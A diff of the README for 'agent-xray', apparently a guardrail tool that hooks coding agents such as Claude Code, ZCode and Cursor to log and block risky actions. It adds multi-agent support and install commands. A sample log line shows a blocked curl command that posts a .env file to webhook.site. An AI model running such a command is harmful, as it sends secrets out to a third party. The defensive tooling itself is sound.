@@ -9,18 +9,35 @@
 18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
 ```
 
-> Status: **v0.2** — Claude Code support via its `PreToolUse` hook, plus a local web dashboard. Zero runtime dependencies. Node 18+.
+> Status: **v0.3** — multi-agent: Claude Code, ZCode and Cursor via their hook APIs; local web dashboard with a 3D "universe" view. Zero runtime dependencies. Node 18+.
+
+## Agents
+
+`agent-xray agents` lists what is installed on this machine and what is supported:
+
+| Agent | Status |
+|---|---|
+| Claude Code | ✔ full support (`PreToolUse` hook in `~/.claude/settings.json`) |
+| ZCode | ✔ full support (`PreToolUse` in `~/.zcode/cli/config.json`, needs a ZCode restart) |
+| Cursor | ✔ beta (`beforeShellExecution` + `beforeReadFile` in `~/.cursor/hooks.json`) |
+| Codex CLI, Gemini CLI, OpenCode, Windsurf, Aider | detected, but they have no hook API yet — the local proxy mode (roadmap) will cover them |
+
+```bash
+node dist/cli.js install        # every supported agent found on this machine
+node dist/cli.js install zcode  # just one: claude | zcode | cursor | project
+node dist/cli.js uninstall      # removes only our hooks (backups are kept)
+```
 
 ## Quick start
 
 ```bash
 git clone <this repo> && cd agent-xray
-node dist/cli.js install        # adds the hook to ~/.claude/settings.json (backup is kept)
+node dist/cli.js install        # hooks for every supported agent (backups are kept)
 node dist/cli.js dashboard      # web dashboard on http://127.0.0.1:8787 (opens the browser)
 node dist/cli.js watch          # or: live feed in the terminal
-# restart Claude Code and use it as usual
+# restart your agent(s) and use them as usual
 node dist/cli.js report         # summary + risk grade
-node dist/cli.js uninstall      # removes only our hook
+node dist/cli.js uninstall      # removes only our hooks
 ```
 
 Try it without any agent: `node dist/cli.js demo` (add `--log` to also feed the event log, e.g. before opening the dashboard).
@@ -80,7 +97,7 @@ agent-xray is a **guardrail and a window, not a sandbox.**
 - [x] Web dashboard on localhost
 - [ ] README badge + shareable session report
 - [ ] OS-level strict mode (eBPF / seccomp on Linux)
-- [ ] Cursor and other agents
+- [x] Claude Code + ZCode + Cursor (hook APIs); proxy mode for the rest
 
 ## Development
 
